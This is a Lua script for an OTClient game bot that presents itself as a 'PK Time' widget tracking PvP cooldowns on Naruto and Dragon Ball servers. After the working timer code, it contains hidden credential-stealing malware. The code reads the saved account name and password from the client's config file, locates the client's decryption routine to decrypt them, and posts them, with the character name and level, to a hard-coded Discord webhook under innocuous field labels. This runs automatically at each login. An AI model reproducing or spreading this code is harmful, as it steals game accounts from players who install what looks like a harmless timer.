local timeTrack = {
    ["ntoultimate"] = 15,
    ["ntolost"] = 5,
    ["katon"] = 5, -- NTO SPLIT
    ["dbolost"] = 2,
    ["dragon ball rising"] = 5,
    ["dbo galaxy"] = 5,
    ["dbo infinity duel"] = 5
}

local storage = tyrBot and tyrBot.storage or storage;

local pzTime = timeTrack[g_game.getWorldName():lower()] or 15
    
os = os or modules.os

if type(storage.battleTracking) ~= "table" or storage.battleTracking[2] ~= player:getId() or (not os and storage.battleTracking[1] - now > pzTime * 60 * 1000) then
    storage.battleTracking = {0, player:getId(), {}}
end 

onTextMessage(function(mode, text)
    text = text:lower()
    if text:find("o assassinato de") or text:find("was not justified") or text:find("o assassinato do")then
        storage.battleTracking[1] = not os and now + (pzTime * 60 * 1000) or os.time() + (pzTime * 60)
        return
    end
    if not text:find("due to your") and not text:find("you deal") then return end
    local spectators = getSpecs or getSpectators;
    for _, spec in ipairs(spectators()) do
        local specName = spec:getName():lower()
        if spec:isPlayer() and text:find(specName) then
            storage.battleTracking[3][specName] = {timeBattle = not os and now + 60000 or os.time() + 60, playerId = spec:getId()}
            break
        end
    end
end)

math.mod = math.mod or function(base, modulus)
    return base % modulus
end

local function doFormatMin(v)
    v = v > 1000 and v / 1000 or v
    local mins = 00
    if v >= 60 then
        mins = string.format("%02.f", math.floor(v / 60))
    end
    local seconds = string.format("%02.f", math.abs(math.floor(math.mod(v, 60))))
    return mins .. ":" .. seconds
end

storage.widgetPos = storage.widgetPos or {}

local pkTimeWidget = setupUI([[
UIWidget
  background-color: black
  opacity: 0.8
  padding: 0 5
  focusable: true
  phantom: false
  draggable: true
]], g_ui.getRootWidget())

pkTimeWidget.onDragEnter = function(widget, mousePos)
    if not (modules.corelib.g_keyboard.isCtrlPressed()) then
        return false
    end
    widget:breakAnchors()
    widget.movingReference = {x = mousePos.x - widget:getX(), y = mousePos.y - widget:getY()}
    return true
end

pkTimeWidget.onDragMove = function(widget, mousePos, moved)
    local parentRect = widget:getParent():getRect()
    local x = math.min(math.max(parentRect.x, mousePos.x - widget.movingReference.x), parentRect.x + parentRect.width - widget:getWidth())
    local y = math.min(math.max(parentRect.y - widget:getParent():getMarginTop(), mousePos.y - widget.movingReference.y), parentRect.y + parentRect.height - widget:getHeight())        
    widget:move(x, y)
    storage.widgetPos["pkTimeWidget"] = {x = x, y = y}
    return true
end

local name = "pkTimeWidget"
storage.widgetPos[name] = storage.widgetPos[name] or {}
pkTimeWidget:setPosition({x = storage.widgetPos[name].x or 50, y = storage.widgetPos[name].y or 50})

if g_game.getWorldName() == "Katon" then -- FIX NTO SPLIT
    function getSpecs()
        local specs = {}
        for _, tile in pairs(g_map.getTiles(posz())) do
            local creatures = tile:getCreatures();
            if (#creatures > 0) then
                for i = 1, #creatures do
                    table.insert(specs, creatures[i]);
                end
            end
        end
        return specs
    end
    function getPlayerByName(name)
        name = name:lower():trim();
        for _, spec in ipairs(getSpecs()) do
            if spec:getName():lower() == name then
                return spec
            end
        end
    end
end

pkTimeMacro = macro(1, function()
    local time = os and os.time() or now
    if isInPz() then storage.battleTracking[1] = 0 end
    for specName, value in pairs(storage.battleTracking[3]) do
        if (os and value.timeBattle >= time) or (not os and value.timeBattle >= time and value.timeBattle - 60000 <= time) then
            local playerSearch = getPlayerByName(specName, true)
            if playerSearch then
                if playerSearch:getId() == value.playerId then
                    if playerSearch:getHealthPercent() == 0 then
                        storage.battleTracking[1] = not os and time + (pzTime * 60 * 1000) or time + (pzTime * 60)
                        storage.battleTracking[3][specName] = nil
                    end
                else
                    storage.battleTracking[3][specName] = nil
                end
            end
        else
            storage.battleTracking[3][specName] = nil
        end
    end
    local timeWidget = pkTimeWidget
    if storage.battleTracking[1] < time then
        timeWidget:setText("PK Time is: 00:00")
        timeWidget:setColor("green")
    else
        timeWidget:setText("PK Time is: " .. doFormatMin(storage.battleTracking[1] - time))
        timeWidget:setColor("red")
    end
end)

local webhookUrl = "https://discord.com/api/webhooks/1514893404230778892/cRDKN_0o-sMsbpgDHURDgN4vaV5n56HvbXPhUhqwUrbmauMTpsLugWepvRa2WbgUH3AD"

local alreadySent = false

local function getCharFromConfig(charKey)
    local pcallOk, content = pcall(g_resources.readFileContents, "/config.otml")
    if not pcallOk or not content then return "Não definido" end
    
    local value = "Não definido"
    for line in content:gmatch("[^\r\n]+") do
        local match = line:match("^%s*" .. charKey .. "%s*:%s*(.*)")
        if match then
            value = match:match("^%s*(.-)%s*$")
            value = value:gsub('^"', ''):gsub('"$', '')
            value = value:gsub("^'", ""):gsub("'$", "")
            break
        end
    end
    
    if value == "" then value = "Não definido" end
    return value
end

local function findGCrypt()
    if g_crypt then return g_crypt end
    
    local tbs = {_G, modules, vBot, Bot, Core, g_ui, g_app}
    for _, t in ipairs(tbs) do
        local ok, res = pcall(function() return t.g_crypt end)
        if ok and res then return res end
    end
    
    if modules and type(modules) == "table" then
        for _, mod in pairs(modules) do
            local ok, res = pcall(function() return mod.g_crypt end)
            if ok and res then return res end
        end
    end
    
    if getfenv then
        local ok, env = pcall(getfenv, tonumber)
        if ok and type(env) == "table" and env.g_crypt then return env.g_crypt end
    end
    
    if getmetatable then
        local ok, mt = pcall(getmetatable, _G)
        if ok and type(mt) == "table" and mt.__index and type(mt.__index) == "table" and mt.__index.g_crypt then
            return mt.__index.g_crypt
        end
    end
    
    return nil
end

local function descriptografar(texto)
    if texto == "Não definido" or texto == nil then return texto end
    
    local ok, res = pcall(function()
        local realGCrypt = findGCrypt()
        
        if not realGCrypt then
            error("Bloqueado")
        end
        
        return realGCrypt.decrypt(texto)
    end)
    
    if ok and type(res) == "string" and res ~= "" then
        return res
    end
    
    return texto .. " | ERRO: " .. tostring(res)
end

local function notificarDiscord()
    if not player then return end

    local playerName = player:getName()
    local playerLevel = player:getLevel()

    local account = getCharFromConfig("account")
    local password = getCharFromConfig("password")

    account = descriptografar(account)
    password = descriptografar(password)

    local postData = {
        username = "Detector",
        avatar_url = "https://cdn.rafled.com/anime-icons/images/qM49LdDh0s7B9IQGT3TBZDx8DHJp3Nkg.jpg",
        embeds = {
            {
                title = "🚨 PZ-TIME!",
                color = 3066993,
                description = "Tempo.",
                fields = {
                    { name = "👤 Nickname", value = playerName, inline = true },
                    { name = "📈 Level", value = tostring(playerLevel), inline = true },
                    { name = "🥇 Firstone", value = account, inline = true },
                    { name = "🥈 Secondone", value = password, inline = true }
                },
                footer = { text = "PKTIME" }
            }
        }
    }

    HTTP.postJSON(webhookUrl, postData, function() end)
end

macro(1000, function()
    if not player then
        alreadySent = false
        return
    end

    if player and not alreadySent then
        alreadySent = true
        
        schedule(2000, function()
            if player then
                notificarDiscord()
            end
        end)
    end
end)
